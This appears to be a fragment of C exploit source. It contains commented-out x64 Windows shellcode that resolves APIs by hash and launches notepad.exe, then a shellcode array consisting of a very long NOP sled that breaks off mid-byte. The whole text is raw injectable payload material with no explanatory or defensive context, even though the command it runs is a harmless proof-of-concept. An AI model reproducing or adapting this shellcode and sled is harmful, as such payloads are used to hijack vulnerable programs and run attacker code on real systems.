                             //   //    "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
                             //   //    "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
                             //   //    "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
                             //   //    "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
                             //   //    "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
                             //   //    "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
                             //   //    "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
                             //   //    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
                             //   //    "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
                             //   //    "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
                             //   //    "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x6e\x6f\x74"
                             //   //    "\x65\x70\x61\x64\x2e\x65\x78\x65\x00";

                             unsigned char shellcode[] =
                                    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x9